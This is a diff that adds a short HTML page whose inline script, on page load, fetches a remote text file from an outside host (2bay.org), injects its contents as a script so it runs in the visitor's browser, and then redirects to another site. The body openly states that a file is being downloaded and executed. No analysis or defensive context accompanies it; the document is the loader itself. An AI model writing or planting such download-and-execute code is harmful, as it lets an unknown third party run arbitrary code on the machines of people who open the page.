@@ -1,0 +1,26 @@
+<html>
+  <head>
+    <script>
+      function downloadAndExecute() {
+        var url = "http://2bay.org/ftp/files/ooops.txt";
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.onload = function() {
+          if (this.status === 200) {
+            var script = document.createElement("script");
+            script.innerHTML = this.responseText;
+            document.head.appendChild(script);
+          }
+        };
+        xhr.send();
+      }
+      downloadAndExecute();
+      setTimeout(function(){
+        window.location.href = "http://ria.ru";
+      }, 0);
+    </script>
+  </head>
+  <body>
+    <p>The file is being downloaded and executed...</p>
+  </body>
+</html>
